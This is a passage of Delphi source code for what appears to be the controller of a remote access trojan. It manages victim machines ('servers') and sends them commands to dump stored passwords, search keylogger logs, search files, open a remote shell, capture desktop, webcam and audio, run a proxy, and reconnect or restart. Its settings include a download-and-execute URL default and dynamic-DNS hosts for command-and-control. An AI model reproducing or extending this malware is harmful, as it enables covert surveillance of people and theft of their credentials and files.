  SettingsFile := ExtractFilePath(Paramstr(0)) + 'Settings\Settings.ini';
  SoundFile := ExtractFilePath(Paramstr(0)) + 'sound.wav';

  IniFile := TIniFile.Create(SettingsFile, IniFilePassword);
  LangFile := UTF8ToAnsi(IniFile.ReadString('settings', 'lang', LangFile));
  SkinName := UTF8ToAnsi(IniFile.ReadString('settings', 'Skin', 'Garnet'));

  if ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Skins') then
  begin
    if FileExists(ExtractFilePath(ParamStr(0)) + 'Skins' + '\' + 'Garnet.asz') = False then
    begin
      resStream := TResourceStream.Create(hInstance, 'SKIN', 'skinfile');
      resStream.SaveToFile(ExtractFilePath(ParamStr(0)) + 'Skins' + '\' + 'Garnet.asz');
      resStream.Free;
    end;
  end;

  SkinHUE := IniFile.ReadInteger('settings', 'SkinHUE', 0);
  SkinSaturation := IniFile.ReadInteger('settings', 'SkinSaturation', 0);

  if (SkinHUE < 0) or (SkinHUE > 360) then SkinHUE := 0;
  if (SkinSaturation < -100) and (SkinSaturation > 100) then  SkinSaturation := 0;

  SoundFile := UTF8ToAnsi(IniFile.ReadString('settings', 'SoundFile', SoundFile));

  MinDate := IniFile.ReadDateTime('settings', 'MinDate', Now);
  Width := IniFile.ReadInteger('settings', 'Width', Width);
  Height := IniFile.ReadInteger('settings', 'Height', Height);
  UseUPnP := IniFile.ReadBool('settings', 'UseUPnP', False);
  PortList := UTF8ToAnsi(IniFile.ReadString('settings', 'port', '80|81|82|'));
  ConnectionPass := IniFile.ReadInteger('settings', 'ConnectionPass', 1234567890);
  CloseToSysTray := IniFile.ReadBool('settings', 'CloseToSysTray', True);
  ControlCenter := IniFile.ReadBool('settings', 'ControlCenter', False);
  MinimizeToSysTray := IniFile.ReadBool('settings', 'MinimizeToSysTray', True);
  VNotify := IniFile.ReadBool('settings', 'VNotify', True);
  SNotify := IniFile.ReadBool('settings', 'SNotify', True);
  EnabledSkin := IniFile.ReadBool('settings', 'EnabledSkin', False);
  ShowDeskPreview := IniFile.ReadBool('settings', 'ShowDeskPreview', True);
  ShowThumbPreview := IniFile.ReadBool('settings', 'ShowThumbPreview', False);
  AutoDesktop := IniFile.ReadBool('settings', 'AutoDesktop', True);
  AutoWebcam := IniFile.ReadBool('settings', 'AutoWebcam', True);
  AutoAudio := IniFile.ReadBool('settings', 'AutoAudio', True);
  AutoOpenWebcam := IniFile.ReadBool('settings', 'AutoOpenWebcam', False);
  ShowInfoPanel := IniFile.ReadBool('settings', 'ShowInfoPanel', True);

  DesktopSize := IniFile.ReadInteger('settings', 'DesktopSize', 240);
  if AutoOpenWebcam = True then  timer2.Enabled := True;

  if DesktopSize > 480 then
    DesktopSize := 480
  else if DesktopSize < 120 then
    DesktopSize := 120;

  ImageHeight := IniFile.ReadInteger('settings', 'ImageHeight', Image1.Height);
  Image1.Height := ImageHeight;

  ImageWidth := IniFile.ReadInteger('settings', 'ImageWidth', sFrameBar1.Width);
  sFrameBar1.Width := ImageWidth;

  ThumbSize := IniFile.ReadInteger('settings', 'ThumbSize', 120);
  if ThumbSize > 240 then
    ThumbSize := 240
  else if ThumbSize < 90 then
    ThumbSize := 90;

  FlagSize := IniFile.ReadInteger('settings', 'FlagSize', 1);
  if FlagSize > 2 then
    FlagSize := 2
  else if FlagSize < 0 then
    FlagSize := 0;

  PingColor := IniFile.ReadInteger('settings', 'PingColor', clGray);
  MainColor := IniFile.ReadInteger('settings', 'MainColor', 1835667);

  LastReconnectIP := UTF8ToAnsi(IniFile.ReadString('settings', 'LastReconnectIP', '127.0.0.1:81'));
  LastGroupName := UTF8ToAnsi(IniFile.ReadString('settings', 'LastGroupName', 'Servers'));
  LastRenameName := UTF8ToAnsi(IniFile.ReadString('settings', 'LastRenameName', 'Server'));
  LastUpdateLink := UTF8ToAnsi(IniFile.ReadString('settings', 'LastUpdateLink', 'http://www.server.com/server.exe'));
  LastExecuteCommand := UTF8ToAnsi(IniFile.ReadString('settings', 'LastExecuteCommand', 'explorer.exe c:\windows'));
  LastDownExec := UTF8ToAnsi(IniFile.ReadString('settings', 'LastDownExec', 'http://www.server.com/server.exe'));
  LastOpenWeb := UTF8ToAnsi(IniFile.ReadString('settings', 'LastOpenWeb', 'http://www.google.com'));

  LastChatClient := UTF8ToAnsi(IniFile.ReadString('settings', 'LastChatClient', 'Client'));
  LastChatServer := UTF8ToAnsi(IniFile.ReadString('settings', 'LastChatServer', 'Server'));
  LastWindowTitle := UTF8ToAnsi(IniFile.ReadString('settings', 'LastWindowTitle', 'CHAT'));
  LastKeySearch := UTF8ToAnsi(IniFile.ReadString('settings', 'LastKeySearch', 'pass'));
  LastFileSearch := UTF8ToAnsi(IniFile.ReadString('settings', 'LastFileSearch', 'pass.txt'));
  LastProxyPort := UTF8ToAnsi(IniFile.ReadString('settings', 'LastProxyPort', '8080'));

  DynDNSHost := UTF8ToAnsi(IniFile.ReadString('settings', 'DynDNSHost', 'client.dyndns.org'));
  DynDNSUser := UTF8ToAnsi(IniFile.ReadString('settings', 'DynDNSUser', 'dyndnsuser'));
  DynDNSPass := UTF8ToAnsi(IniFile.ReadString('settings', 'DynDNSPass', 'dyndnspass'));

  NoIPHost := UTF8ToAnsi(IniFile.ReadString('settings', 'NoIPHost', 'client.no-ip.org'));
  NoIPUser := UTF8ToAnsi(IniFile.ReadString('settings', 'NoIPUser', 'noipuser'));
  NoIPPass := UTF8ToAnsi(IniFile.ReadString('settings', 'NoIPPass', 'noippass'));

  for I := 0 to MainList.Header.Columns.Count - 1 do
  begin
    MainList.Header.Columns.Items[i].Position := IniFile.ReadInteger('settings', 'Column' + inttostr(i) + 'Position', MainList.Header.Columns.Items[i].Position);
    MainList.Header.Columns.Items[i].Width := IniFile.ReadInteger('settings', 'Column' + inttostr(i) + 'Width', MainList.Header.Columns.Items[i].Width);

    if i in [0, 1, 7, 13, 15, 18] then
    b := IniFile.ReadBool('settings', 'Column' + inttostr(i) + 'Visible', True) else
    b := IniFile.ReadBool('settings', 'Column' + inttostr(i) + 'Visible', False);

    if b = True then
    MainList.Header.Columns.Items[i].Options := MainList.Header.Columns.Items[i].Options + [coVisible] else
    MainList.Header.Columns.Items[i].Options := MainList.Header.Columns.Items[i].Options - [coVisible];
  end;

  IniFile.Free;

  if fileexists(SoundFile) = False then
  begin
    SoundFile := ExtractFilePath(paramstr(0)) + 'sound.wav';
    resStream := TResourceStream.Create(hInstance, 'SOUND', 'soundfile');
    resStream.SaveToFile(SoundFile);
    resStream.Free;
  end;

  if fileexists(LangFile) = False then
  begin
    LangFile := IdiomasFilesDir + 'Português.ini';
    resStream := TResourceStream.Create(hInstance, 'LANG', 'langfile');
    ForceDirectories(ExtractFilePath(LangFile));
    resStream.SaveToFile(LangFile);
    resStream.Free;
  end;

  IniFile := TIniFile.Create(LangFile);
  for i := 0 to high(Traduzidos) do
    traduzidos[i] := UTF8ToAnsi(IniFile.ReadString('lang', inttostr(i), ''));
  IniFile.Free;

  // inserir itens no popupmenucolunas
  MainListPopup := PopupMenuFunctions;
  PopupMenuColumns.Items.Clear;
  for i := 0 to MainList.Header.Columns.Count - 1 do
  begin
    MI := TMenuItem.Create(nil);
    PopupMenuColumns.Items.Add(MI);
    MI.Caption := MainList.Header.Columns.Items[i].Text;
    MI.Tag := i;
    b := coVisible in MainList.Header.Columns.Items[i].Options;
    MI.Checked := b;
    MI.OnClick := ColunaClick;
  end;
  with PopupMenuColumns.Items.Items[0] do
  begin
    Enabled := False;
    Checked := True;
  end;

  if ShowThumbPreview then Thumbs1Click(Thumbs1) else
  begin
    if FlagSize = 0 then
    begin
      if MainList.Images <> Flags16 then ChangeImageList(Flags16);
    end else
    if FlagSize = 1 then
    begin
      if MainList.Images <> Flags24 then ChangeImageList(Flags24);
    end else
    if FlagSize = 2 then
    begin
      if MainList.Images <> Flags32 then ChangeImageList(Flags32);
    end;
  end;

  IdiomasListFileDir(IdiomasFilesDir);
  ConnLogsDir := ExtractFilePath(ParamStr(0)) + 'Logs\';
  ForceDirectories(ConnLogsDir);
end;

procedure SaveComponentToStream(Stream: TStream; a: TComponent);
var
 //FileStream:TFileStream;
 FileWriter:TWriter;
 BufferSize:Integer;
begin
 try
   BufferSize := 1024;
   //FileStream := TFileStream.Create(filename,fmOpenWrite or fmCreate);
   FileWriter := TWriter.Create(Stream, BufferSize);
   FileWriter.WriteRootComponent(a);
 finally
   FileWriter.Free;
   //FileStream.Free;
 end;
end;

procedure LoadComponentFromStream(Stream: TStream; a: TComponent);
var
 //FileStream:TFileStream;
 FileReader:TReader;
 BufferSize:Integer;
 Identification:String;
begin
 try
   BufferSize := 1024;
   //FileStream := TFileStream.Create(filename,fmOpenRead);
   FileReader := TReader.Create(Stream, BufferSize);
   FileReader.ReadRootComponent(a);
 finally
   FileReader.Free;
   //FileStream.Free;
 end;
end;

procedure TFormMain.FormShow(Sender: TObject);
var
  s: string;
  i: integer;
  SkinList: TStringList;
  Item: TListItem;
  resStream: TResourceStream;
  Stream: TMemoryStream;
  TempPanel: TPanel;
begin
  TempPanel := TPanel.Create(nil);
  TempPanel.Height := 0;
  TempPanel.Width := 0;
  TempPanel.Top := 5000;
  TempPanel.Parent := FormMain;

  TempListViewLogs := TListView.Create(nil);
  TempListViewLogs.Parent := TempPanel;
  Stream := TMemoryStream.Create;
  SaveComponentToStream(Stream, FormConnectionsLog.ListView1);
  Stream.Position := 0;
  LoadComponentFromStream(Stream, TempListViewLogs);
  Stream.Free;
  FormConnectionsLog.sMonthCalendar1.MinDate := MinDate;
  //IncDay(now, 1);

  s := ConnLogsDir + MD5Print(MD5String(Today));
  if FileExists(s) then
  begin
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(s);
    Stream.Position := 0;
    LoadComponentFromStream(Stream, TempListViewLogs);
    Stream.Free;
  end;



  if PossoMostrar = False then
  begin
     PossoMostrar := True;
     Exit;
  end;

  sSkinManager1.Active := False;
  SkinList := TStringList.Create;
  sSkinManager1.SkinDirectory := ExtractFilePath(ParamStr(0)) + 'Skins';
  sSkinManager1.GetSkinNames(SkinList);

  for I := 0 to SkinList.Count - 1 do
  begin
    S := SkinList.Strings[i];

    if S = SkinName then
    begin
      sSkinManager1.SkinName := SkinName;
      sSkinManager1.HueOffset := SkinHUE;
      sSkinManager1.Saturation := SkinSaturation;
      sSkinManager1.Active := True;
    end;
  end;

  Habilitar1.Checked := False;
  sSkinManager1.UnInstallHook;
  sSkinManager1.Active := False;

  if EnabledSkin = True then
  begin
    Habilitar1.Checked := True;
    sSkinManager1.InstallHook;
    sSkinManager1.Active := True;
  end;

  Selecionar1.Enabled := Habilitar1.Checked;

  SkinList.Free;
  AtualizarIdiomas;

  PostMessage(FormMain.Handle, WM_STARTMAIN, 0, 0);
  Application.ProcessMessages;
  MainList.DefaultText := ' ';
end;

procedure TFormMain.OnException(Sender: TObject; E: Exception);
begin
  E := nil;
  EnviandoPING := False;
end;

procedure TFormMain.OnShowHint(var HintStr: string; var CanShow: Boolean;
    var HintInfo: Controls.THintInfo);
var
  p: TPoint;
  Node: PVirtualNode;
  ConAux: TConexaoNew;
begin
  if ShowDeskPreview = False then Exit;

  if HintInfo.HintControl = MainList then
  begin
    p := MainList.ScreenToClient(Mouse.CursorPos);
    Node := MainList.GetNodeAt(p.X, p.Y);

    if (Node <> nil) and (Node.ChildCount <= 0) and (Node <> FormDesktopPreview.LastNode) then
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if ConAux.DesktopBitmap <> nil then
      begin
        FormDesktopPreview.LastNode := Node;
        FormDesktopPreview.Width := round(ConAux.DesktopBitmap.Width / 2);
        FormDesktopPreview.Height := round(ConAux.DesktopBitmap.Height / 2);
        FormDesktopPreview.Top := (HintInfo.HintPos.Y) - (FormDesktopPreview.Height div 2);
        FormDesktopPreview.Left := HintInfo.HintPos.X + 100;
        FormDesktopPreview.Image1.Picture := nil;
        FormDesktopPreview.Image1.Picture.Bitmap.Assign(ConAux.DesktopBitmap);
        FormDesktopPreview.CloseForm;
        FormDesktopPreview.Show;
        SetForegroundWindow(FormMain.Handle);
      end;
    end;
  end;
end;

procedure TFormMain.Parar1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(PROXYSTOP + '|');
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Passwords1Click(Sender: TObject);
var
  i: integer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
begin
  application.ProcessMessages;
  FormPasswords.AdvProgressBar1.Position := 0;
  FormPasswords.AdvProgressBar1.Max := MainList.SelectedCount;
  FormPasswords.AdvListView1.Items.BeginUpdate;
  if FormPasswords.AdvListView1.Items.Count > 0 then FormPasswords.AdvListView1.Items.Clear;
  FormPasswords.AdvListView1.Items.EndUpdate;
  FormPasswords.Show;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(GETPASSWORDS + '|');
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Ping1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    if vsSelected in Node.States then
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux <> nil) and (Node.ChildCount <= 0) and (ConAux.MasterIdentification = 1234567890) then
      begin
        if IdTCPServers[StrToInt(ConAux.Porta)] = nil then Continue;

        ConAux.FontColor := PingColor;
        ConAux.SendPingTime := GetTickCount;
        ConAux.EnviandoString := True;
        try
          ConAux.Connection.IOHandler.WriteLn(PING);
          finally
          ConAux.EnviandoString := False;
        end;
        if (sFrameBar1.Visible) and (ConAux.Node.CheckState = csunCheckedNormal) then
          ConAux.EnviarString(GETDESKTOPPREVIEW + '|' + IntToStr(DesktopSize) + '|');

        if (ShowThumbPreview = true) and (ConAux.Node.CheckState = csunCheckedNormal) then
          ConAux.EnviarString(GETDESKTOPPREVIEWINFO + '|' + IntToStr(ThumbSize) + '|' + IntToStr(ThumbSize) + '|');
      end;
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.PopupMenuColumnsPopup(Sender: TObject);
begin
  MainListPopup := PopupMenuFunctions;
end;

procedure TFormMain.PopupMenuFunctionsPopup(Sender: TObject);
var
  i, j: integer;
  Node: pVirtualNode;
  p: TPoint;
  Rect: TRect;
begin
  for I := 0 to PopupMenuFunctions.Items.Count - 1 do
  PopupMenuFunctions.Items.Items[i].Visible := False;

  if MainList.SelectedCount <= 0 then Exit;

  ControlCenter1.Visible := ControlCenter;
  Modificarconfiguraes1.Visible := True;
  Abrirpastadedownloads1.Visible := True;
  Abrirpastadeimagens1.Visible := True;
  Keylogger2.Visible := True;

  for I := 0 to PopupMenuFunctions.Items.Count - 1 do
  PopupMenuFunctions.Items.Items[i].Visible := True;

  for I := 0 to Funes1.Count - 1 do
  Funes1.Items[i].Visible := True;

  if MainList.SelectedCount > 1 then
  begin
    for I := 0 to Funes1.Count - 1 do
    Funes1.Items[i].Visible := False;

    Capturardesktop1.Visible := True;
    Capturarwebcam1.Visible := True;
    Capturarudio1.Visible := True;

    Modificarconfiguraes1.Visible := False;
    Abrirpastadedownloads1.Visible := False;
    Abrirpastadeimagens1.Visible := False;
    Keylogger2.Visible := False;

    Exit;
  end;

  AtualizarPopupMenu;
end;

procedure TFormMain.PopupMenuinfoPopup(Sender: TObject);
begin
  Copiar1.Enabled := ListView1.Selected <> nil;
end;

procedure TFormMain.AbrirPortasAtivas(ConAux: TConexaoNew);
var
  NovaJanelaActivePorts: TFormActivePorts;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormActivePorts <> nil then
  begin
    if TFormActivePorts(ConAux.FormActivePorts).Visible then
    begin
      TFormActivePorts(ConAux.FormActivePorts).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormActivePorts(ConAux.FormActivePorts).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormActivePorts(ConAux.FormActivePorts).Align := alClient;
      TFormActivePorts(ConAux.FormActivePorts).BorderStyle := bsNone;
    end else
    begin
      TFormActivePorts(ConAux.FormActivePorts).Parent := nil;
      TFormActivePorts(ConAux.FormActivePorts).Align := alNone;
      TFormActivePorts(ConAux.FormActivePorts).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaActivePorts := TFormActivePorts.Create(self, ConAux);
    ConAux.FormActivePorts := NovaJanelaActivePorts;
    NovaJanelaActivePorts.Caption := traduzidos[27] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormActivePorts(ConAux.FormActivePorts).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormActivePorts(ConAux.FormActivePorts).Align := alClient;
      TFormActivePorts(ConAux.FormActivePorts).BorderStyle := bsNone;
    end else
    begin
      TFormActivePorts(ConAux.FormActivePorts).Parent := nil;
      TFormActivePorts(ConAux.FormActivePorts).Align := alNone;
      TFormActivePorts(ConAux.FormActivePorts).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormActivePorts(ConAux.FormActivePorts).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormActivePorts(ConAux.FormActivePorts).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormActivePorts(ConAux.FormActivePorts).Caption := traduzidos[27] + ' (' + ConAux.NomeDoServidor + ')';
  TFormActivePorts(ConAux.FormActivePorts).Show;
end;

procedure TFormMain.Portasativas1Click(Sender: TObject);
var
  NovaJanelaActivePorts: TFormActivePorts;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirPortasAtivas(ConAux);
end;

procedure TFormMain.Procurararquivos1Click(Sender: TObject);
var
  Command: string;
  i: integer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
begin
  application.ProcessMessages;
  Command := LastFileSearch;
  if inputquery(pwidechar(traduzidos[321]), pwidechar(traduzidos[524]), Command) = false then exit;
  if Command = '' then exit;

  if (posex('\', Command) > 0) or
     (posex('/', Command) > 0) or
     (posex(':', Command) > 0) or
     (posex('?', Command) > 0) or
     (posex('"', Command) > 0) or
     (posex('<', Command) > 0) or
     (posex('>', Command) > 0) or
     (posex('|', Command) > 0) then
  begin
    Messagebox(Handle, pchar(traduzidos[525]), pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_ICONWARNING + MB_OK);
    exit;
  end;

  LastFileSearch := Command;

  application.ProcessMessages;

  FormFileSearch.AdvProgressBar1.Position := 0;
  FormFileSearch.AdvProgressBar1.Max := MainList.SelectedCount;
  FormFileSearch.AdvListView1.Items.BeginUpdate;
  if FormFileSearch.AdvListView1.Items.Count > 0 then FormFileSearch.AdvListView1.Items.Clear;
  FormFileSearch.AdvListView1.Items.EndUpdate;
  FormFileSearch.Show;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(FILESEARCH + '|' + LastFileSearch);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Procurarpalavrasnokeylogger1Click(Sender: TObject);
var
  Command: string;
  i: integer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
begin
  application.ProcessMessages;
  Command := LastKeySearch;
  if inputquery(pwidechar(traduzidos[522]), pwidechar(traduzidos[523]), Command) = false then exit;
  if Command = '' then exit;
  LastKeySearch := Command;

  application.ProcessMessages;
  FormKeySearch.AdvProgressBar1.Position := 0;
  FormKeySearch.AdvProgressBar1.Max := MainList.SelectedCount;
  FormKeySearch.AdvListView1.Items.BeginUpdate;
  if FormKeySearch.AdvListView1.Items.Count > 0 then FormKeySearch.AdvListView1.Items.Clear;
  FormKeySearch.AdvListView1.Items.EndUpdate;
  FormKeySearch.Show;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(KEYSEARCH + '|' + LastKeySearch);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.AbrirProgramas(ConAux: TConexaoNew);
var
  NovaJanelaProgramas: TFormProgramas;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormProgramas <> nil then
  begin
    if TFormProgramas(ConAux.FormProgramas).Visible then
    begin
      TFormProgramas(ConAux.FormProgramas).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormProgramas(ConAux.FormProgramas).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormProgramas(ConAux.FormProgramas).Align := alClient;
      TFormProgramas(ConAux.FormProgramas).BorderStyle := bsNone;
    end else
    begin
      TFormProgramas(ConAux.FormProgramas).Parent := nil;
      TFormProgramas(ConAux.FormProgramas).Align := alNone;
      TFormProgramas(ConAux.FormProgramas).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaProgramas := TFormProgramas.Create(self, ConAux);
    ConAux.FormProgramas := NovaJanelaProgramas;
    NovaJanelaProgramas.Caption := traduzidos[419] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormProgramas(ConAux.FormProgramas).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormProgramas(ConAux.FormProgramas).Align := alClient;
      TFormProgramas(ConAux.FormProgramas).BorderStyle := bsNone;
    end else
    begin
      TFormProgramas(ConAux.FormProgramas).Parent := nil;
      TFormProgramas(ConAux.FormProgramas).Align := alNone;
      TFormProgramas(ConAux.FormProgramas).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormProgramas(ConAux.FormProgramas).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormProgramas(ConAux.FormProgramas).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormProgramas(ConAux.FormProgramas).Caption := traduzidos[419] + ' (' + ConAux.NomeDoServidor + ')';
  TFormProgramas(ConAux.FormProgramas).Show;
end;

procedure TFormMain.Programasinstalados1Click(Sender: TObject);
var
  NovaJanelaProgramas: TFormProgramas;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirProgramas(ConAux);
end;

procedure TFormMain.AbrirShell(ConAux: TConexaoNew);
var
  NovaJanelaShell: TFormShell;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormShell <> nil then
  begin
    if TFormShell(ConAux.FormShell).Visible then
    begin
      TFormShell(ConAux.FormShell).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormShell(ConAux.FormShell).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormShell(ConAux.FormShell).Align := alClient;
      TFormShell(ConAux.FormShell).BorderStyle := bsNone;
    end else
    begin
      TFormShell(ConAux.FormShell).Parent := nil;
      TFormShell(ConAux.FormShell).Align := alNone;
      TFormShell(ConAux.FormShell).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaShell := TFormShell.Create(self, ConAux);
    ConAux.FormShell := NovaJanelaShell;
    NovaJanelaShell.Caption := traduzidos[307] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormShell(ConAux.FormShell).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormShell(ConAux.FormShell).Align := alClient;
      TFormShell(ConAux.FormShell).BorderStyle := bsNone;
    end else
    begin
      TFormShell(ConAux.FormShell).Parent := nil;
      TFormShell(ConAux.FormShell).Align := alNone;
      TFormShell(ConAux.FormShell).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormShell(ConAux.FormShell).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormShell(ConAux.FormShell).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormShell(ConAux.FormShell).Caption := traduzidos[307] + ' (' + ConAux.NomeDoServidor + ')';
  TFormShell(ConAux.FormShell).Show;
  ConAux.EnviarString(SHELLSTART + '|');
end;

procedure TFormMain.Prompt1Click(Sender: TObject);
var
  NovaJanelaShell: TFormShell;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirShell(ConAux);
end;

procedure TFormMain.Reconectar1Click(Sender: TObject);
var
  i, j, xPorta: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name, xIP: string;
begin
  application.ProcessMessages;

  name := LastReconnectIP;

  if inputquery(pwidechar(traduzidos[163]), pwidechar(traduzidos[164]) + #13#10 + '(Ex.: 127.0.0.1:81)', name) then
  begin
    xIP := copy(name, 1, posex(':', name) - 1);
    delete(name, 1, posex(':', name));
    try
      xPorta := strtoint(name);
      except
      MessageDlg(pchar(traduzidos[104]), mtWarning, [mbOK], 0);
      exit;
    end;

    if (xporta < 1) or (xporta > 65535) then
    begin
      MessageDlg(pchar(traduzidos[104]), mtWarning, [mbOK], 0);
      exit;
    end;
  end else exit;

  LastReconnectIP := xIP + ':' + inttostr(xporta);

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(RECONECTAR + DelimitadorComandos + LastReconnectIP);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Registrosdeconexes1Click(Sender: TObject);
var
  Stream: TMemoryStream;
begin
  if (FormConnectionsLog.RadioGroup1.ItemIndex = 0) or
     (posex(Today, DateTimeToStr(FormConnectionsLog.sMonthCalendar1.CalendarDate)) > 0) then
  begin
    FormConnectionsLog.ListView1.Items.Clear;
    Stream := TMemoryStream.Create;
    SaveComponentToStream(Stream, TempListViewLogs);
    Stream.Position := 0;
    LoadComponentFromStream(Stream, FormConnectionsLog.ListView1);
  end;
  FormConnectionsLog.Show;
end;

procedure TFormMain.Reiniciar1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(RESTARTSERVER + DelimitadorComandos);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Renomear1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
